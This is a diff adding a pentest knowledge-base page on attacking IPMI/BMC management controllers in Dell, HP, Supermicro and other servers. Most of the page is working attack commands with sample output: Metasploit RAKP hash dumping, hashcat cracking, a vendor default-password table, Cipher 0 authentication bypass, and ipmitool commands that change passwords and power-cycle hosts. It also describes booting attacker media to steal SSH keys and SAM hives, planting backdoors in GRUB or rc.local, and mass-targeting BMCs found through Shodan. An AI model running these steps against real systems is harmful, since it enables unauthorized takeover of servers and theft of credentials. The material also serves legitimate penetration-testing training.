@@ -1,0 +1,336 @@
+---
+title: IPMI
+description: Intelligent Platform Management Interface footprinting - UDP 623 BMC interrogation, RAKP hash retrieval (CVE-2013-4786), default vendor credentials for Dell iDRAC, HP iLO, and Supermicro, and the path from compromised BMC to host compromise.
+mitre: [T1046, T1078, T1110]
+d3fend: [D3-NTA]
+impact: [CredentialTheft, RCE, InternalAccess]
+sidebar:
+  order: 12
+  label: IPMI
+---
+
+## TL;DR
+
+IPMI is the out-of-band management protocol baked into most enterprise server hardware - Dell iDRAC, HP iLO, IBM IMM, Supermicro IPMI/BMC. It listens on **UDP 623** and provides total control of the host independent of the host's operating system: power on/off, virtual KVM, virtual media (mount an ISO and boot from it). The protocol has multiple well-documented design flaws - the most useful being the [RAKP authentication-hash retrieval](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/) which leaks password hashes without authentication.
+
+```
+# 1. UDP scan (IPMI is UDP)
+sudo nmap -sU -p623 <target>
+
+# 2. Probe with msfconsole's ipmi_version
+msf > use auxiliary/scanner/ipmi/ipmi_version
+msf > set RHOSTS <target>
+msf > run
+
+# 3. RAKP hash retrieval (CVE-2013-4786)
+msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf > set RHOSTS <target>
+msf > run
+# → emits hashes for every BMC user account, suitable for hashcat -m 7300
+
+# 4. Try vendor defaults
+ipmitool -I lanplus -H <target> -U admin -P admin sel list
+ipmitool -I lanplus -H <target> -U ADMIN -P ADMIN user list
+```
+
+Success indicator: `ipmi_dumphashes` emits one hash per local BMC user, or `ipmitool sel list` returns the system event log. Cracking an extracted hash yields BMC admin credentials, and from there it's full host control.
+
+## Protocol overview
+
+IPMI = **Intelligent Platform Management Interface**, defined by Intel (1998), now an open spec. The BMC (Baseboard Management Controller) is a dedicated microcontroller on the server motherboard with its own NIC, CPU, RAM, and OS - typically a small Linux running on an ASPEED or Renesas chip. It runs even when the host is powered off (as long as the chassis has power).
+
+What the BMC provides:
+
+| Capability | What you can do with BMC access |
+| --- | --- |
+| **Power control** | Power on, power off, reset, soft shutdown |
+| **Console / Serial-over-LAN** | Watch the boot process, see kernel panics, interact with the BIOS |
+| **Virtual KVM** | Full graphical console - keyboard, video, mouse - over the network |
+| **Virtual media** | Mount a local ISO or floppy on the host - boot a live CD with your tools |
+| **Sensor monitoring** | Temperature, fan speed, voltages, system event log |
+| **Firmware update** | Flash new BIOS, BMC firmware |
+| **Local user accounts** | Manage BMC's own user list (independent of host OS) |
+
+The implication: BMC root = host root. With virtual media + reboot, you mount your live USB ISO, boot the host into your environment, and read/write any data on the host's disks. Disk-encryption-at-rest is the only meaningful defense against a compromised BMC, and even that often loses to a coercive cold-boot if you have physical access semantics.
+
+### Vendor BMC names
+
+| Vendor | BMC product name | Default user |
+| --- | --- | --- |
+| Dell | iDRAC (Integrated Dell Remote Access Controller) | `root` / `calvin` |
+| HP / HPE | iLO (Integrated Lights Out) | `Administrator` / random factory password (printed on a sticker, often `password`) |
+| IBM / Lenovo | IMM (Integrated Management Module), IMM2, XCC | `USERID` / `PASSW0RD` (zero, not O) |
+| Supermicro | IPMI / SMC IPMI | `ADMIN` / `ADMIN` |
+| Cisco | CIMC (Cisco Integrated Management Controller) | `admin` / `password` |
+| Fujitsu | iRMC (integrated Remote Management Controller) | `admin` / `admin` |
+
+These defaults persist surprisingly often in production. Sysadmins rack a server, configure the host OS, and never touch the BMC after factory.
+
+## Default configuration
+
+The IPMI specification mandates certain user-management defaults:
+
+- User slot 1 reserved for "anonymous" (no name, no password) - usually disabled but not always
+- User slot 2 is typically the named admin account
+- Up to 15 named user accounts (limit varies by vendor)
+- Each user has channel-specific privilege (Callback / User / Operator / Administrator / OEM)
+- Each user has cipher-suite policy
+
+Default cipher suites in older IPMI 2.0 implementations include **Cipher 0** - which advertises encryption support but actually performs no encryption or authentication. Some BMCs ship with Cipher 0 enabled and accept connections that skip auth entirely.
+
+## Dangerous settings / vulnerabilities
+
+| Issue | What it enables |
+| --- | --- |
+| **CVE-2013-4786 / RAKP** | Pre-auth password-hash retrieval - design flaw, not patchable |
+| Cipher 0 enabled | Auth-bypass - connect and run privileged commands without credentials |
+| Default credentials unchanged | Vendor defaults work directly |
+| BMC exposed to public internet | Anyone on the internet can attack it |
+| BMC on same subnet as production | Compromise lateral-spreads quickly |
+| Firmware not updated | BMC firmware itself contains exploitable services (web app, SSH, SNMP) |
+| Anonymous null-session enabled | Some IPMI implementations allow channel 1 with empty user |
+| Web UI on the BMC | Often runs old Apache, old OpenSSL, with auth-bypass and command-injection CVEs |
+| Telnet enabled on BMC | Plaintext credentials, complete control via SMASH-CLP shell |
+| SSH on BMC with shared default key | Many vendors ship a default SSH key - pivot via that key |
+
+The RAKP vulnerability is the operator's primary target - design-level (not patchable), works pre-auth, returns crackable hashes for every BMC user account.
+
+## Footprinting commands
+
+### UDP scan
+
+```shell
+sudo nmap -sU -p623 10.129.14.128
+```
+
+```
+PORT    STATE         SERVICE
+623/udp open|filtered asf-rmcp
+```
+
+`open|filtered` is the common UDP result. Confirm via Metasploit module:
+
+```shell
+msfconsole
+msf > use auxiliary/scanner/ipmi/ipmi_version
+msf > set RHOSTS 10.129.14.128
+msf > run
+```
+
+```
+[+] 10.129.14.128:623 - IPMI - IPMI-2.0
+   UserAuth(auth_msg, auth_user, non_null_user)
+   PassAuth(password, md5, md2)
+   Level(2.0)
+[*] Auxiliary module execution completed
+```
+
+That tells you IPMI 2.0 is running. The next step is RAKP hash retrieval.
+
+### RAKP hash retrieval (CVE-2013-4786)
+
+```shell
+msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf > set RHOSTS 10.129.14.128
+msf > set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
+msf > run
+```
+
+```
+[+] 10.129.14.128:623 - IPMI - Hash found: ADMIN:0a14000000000000a3b13c20...
+[+] 10.129.14.128:623 - IPMI - Hash found: root:0a14000000000000bc4f9d35...
+[+] 10.129.14.128:623 - IPMI - Hash found: operator:0a14000000000000ee2a..
+```
+
+The output format is `<username>:<hex hash>`. Each is a HMAC-SHA1 over a randomized challenge - same family as Kerberos AS-REP roasting, crackable offline.
+
+The mechanics: the RAKP protocol exchanges a hash of the user's password as part of the auth handshake. The flaw is that the BMC sends this hash *before* verifying that the requesting client knows the password - making the hash available to any client that can send well-formed RAKP messages.
+
+Save the hash for hashcat:
+
+```
+$ipmi$ADMIN$0a14000000000000a3b13c20...
+```
+
+Format is `$ipmi$<username>$<hex hash>`. Then:
+
+```shell
+hashcat -m 7300 ipmi.hashes /usr/share/wordlists/rockyou.txt
+```
+
+`-m 7300` is the IPMI 2.0 RAKP HMAC-SHA1 mode. Cracking rate is fast - typical hardware gets hundreds of millions of guesses per second on this mode. Most default and short passwords fall in minutes.
+
+### Vendor default credential test
+
+While `ipmi_dumphashes` cracks, in parallel try the vendor defaults:
+
+```shell
+ipmitool -I lanplus -H 10.129.14.128 -U admin -P admin user list
+```
+
+If creds work:
+
+```
+ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
+1                    true    false      false      Unknown (0x00)
+2   ADMIN            true    true       true       ADMINISTRATOR
+3   operator         true    true       true       OPERATOR
+4                    true    false      false      Unknown (0x00)
+```
+
+`ipmitool` is the canonical CLI:
+
+```shell
+# Test connection
+ipmitool -I lanplus -H <target> -U admin -P admin chassis status
+
+# System event log
+ipmitool -I lanplus -H <target> -U admin -P admin sel list
+
+# Sensor readings
+ipmitool -I lanplus -H <target> -U admin -P admin sdr
+
+# Power state
+ipmitool -I lanplus -H <target> -U admin -P admin power status
+
+# Power on
+ipmitool -I lanplus -H <target> -U admin -P admin power on
+
+# Power off
+ipmitool -I lanplus -H <target> -U admin -P admin power off
+
+# Reset (hard reboot)
+ipmitool -I lanplus -H <target> -U admin -P admin power reset
+
+# Serial-over-LAN console
+ipmitool -I lanplus -H <target> -U admin -P admin sol activate
+
+# Network configuration
+ipmitool -I lanplus -H <target> -U admin -P admin lan print 1
+
+# List BMC users
+ipmitool -I lanplus -H <target> -U admin -P admin user list
+
+# Set a user password (when you have admin auth)
+ipmitool -I lanplus -H <target> -U admin -P admin user set password 2 NewPass
+
+# Enable a user
+ipmitool -I lanplus -H <target> -U admin -P admin user enable 2
+```
+
+The `-I lanplus` selects IPMI 2.0 over LAN (correct for almost all modern BMCs).
+
+### Cipher 0 auth bypass
+
+If Cipher 0 is enabled, you skip authentication entirely:
+
+```shell
+ipmitool -I lanplus -C 0 -H 10.129.14.128 -U admin -P '' user list
+```
+
+`-C 0` selects cipher zero. If it works, you can list users, change passwords, do anything - no actual auth performed.
+
+Detection:
+
+```shell
+msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
+msf > set RHOSTS 10.129.14.128
+msf > run
+```
+
+### Anonymous / null-session
+
+Some BMCs allow an anonymous channel-1 user (the IPMI spec's "user 1, no name, no password"):
+
+```shell
+ipmitool -I lanplus -H 10.129.14.128 -U '' -P '' user list
+```
+
+If this works, you've got read access (sometimes write) without credentials.
+
+### Web UI enumeration
+
+Every modern BMC also runs a web UI on HTTPS (sometimes HTTP). Browse to it:
+
+```
+https://<target>/
+```
+
+Vendor-specific paths and login flows:
+
+- iDRAC: `https://target/login.html`
+- iLO: `https://target/login.html` (older) or `/ssoauth/login` (newer)
+- Supermicro: `https://target/cgi/login.cgi`
+- IMM2/XCC: `https://target/`
+
+The web UIs themselves have had numerous CVEs - auth-bypass via HTTP request smuggling, command injection in CGI handlers, SQL injection on internal databases. Run a normal HTTP scan against the BMC's web port - it often turns up findings independent of IPMI.
+
+### SSH on the BMC
+
+Many BMCs also expose SSH (for SMASH-CLP, a vendor-specific management shell):
+
+```shell
+ssh admin@<target>
+```
+
+Default creds match the IPMI defaults. SMASH-CLP shell commands let you do most of what IPMI lets you do - and on some vendor implementations, you can shell-escape into the BMC's underlying Linux.
+
+## From BMC compromise to host compromise
+
+Once you have BMC admin:
+
+1. **Serial-over-LAN console** - watch the boot, intercept BIOS prompts, modify boot order via the BMC's chassis-boot-device command:
+   ```shell
+   ipmitool -I lanplus -H <target> -U admin -P admin chassis bootdev cdrom
+   ipmitool -I lanplus -H <target> -U admin -P admin power reset
+   ipmitool -I lanplus -H <target> -U admin -P admin sol activate
+   ```
+
+2. **Virtual media** - through the web UI, mount a Linux live ISO from your attack box. Set bootdev to virtual CD. Reboot. You're now booted into your own environment with the host's disks visible.
+
+3. **Read disks offline** - once booted, the host's drives appear as `/dev/sda` etc. Mount, copy SSH keys, dump SAM/SYSTEM hives (for Windows hosts), read database files.
+
+4. **Modify host bootloader** - write a backdoor into GRUB, an init script, or `/etc/rc.local` (for Linux) before unmounting. Boot the host normally - your backdoor activates on next boot.
+
+5. **For domain-joined Windows** - boot a live Windows PE, dump credentials from the SAM/SYSTEM hives offline (`secretsdump.py` against the file paths), and you have domain credentials.
+
+The chain "exposed IPMI on public internet → RAKP hash crack → BMC admin → virtual media → domain controller compromise" is one of the most reliable cloud-data-center attack paths historically - many providers exposed BMC nets before this became widely understood.
+
+## Common chained workflows
+
+**Internet-exposed BMC → RAKP → host pwn:**
+1. Shodan search `port:623` for IPMI on internet
+2. `ipmi_dumphashes`
+3. Crack the hashes
+4. `ipmitool` + virtual media → host compromise
+
+**Internal BMC subnet → multi-host pwn:**
+1. Inside a corporate network, identify the BMC management subnet (often `10.x.x.x/24` with hostnames like `idrac-*` or `ilo-*`)
+2. Mass `ipmi_dumphashes` against the subnet
+3. Many BMCs share the same admin password across the fleet
+4. Crack once, pwn all
+
+**BMC web UI → CVE exploit:**
+1. Browser to the BMC HTTPS port
+2. Identify vendor + version from page source
+3. Check CVE database for that BMC version
+4. Many have unauth RCE in older firmware
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| UDP scan | `sudo nmap -sU -p623 <target>` |
+| IPMI version probe | `msf > use auxiliary/scanner/ipmi/ipmi_version` |
+| RAKP hash dump | `msf > use auxiliary/scanner/ipmi/ipmi_dumphashes` |
+| Cipher 0 test | `msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero` |
+| Crack hash | `hashcat -m 7300 ipmi.hashes wordlist` |
+| Test creds | `ipmitool -I lanplus -H <target> -U admin -P admin user list` |
+| Chassis status | `ipmitool -I lanplus -H <target> -U <u> -P <p> chassis status` |
+| Power on/off/reset | `ipmitool ... power [on|off|reset]` |
+| Serial console | `ipmitool ... sol activate` |
+| Boot from CD | `ipmitool ... chassis bootdev cdrom` |
+| List BMC users | `ipmitool ... user list` |
+| Set password | `ipmitool ... user set password <id> <pass>` |
+| Sensors | `ipmitool ... sdr` |
+| Event log | `ipmitool ... sel list` |
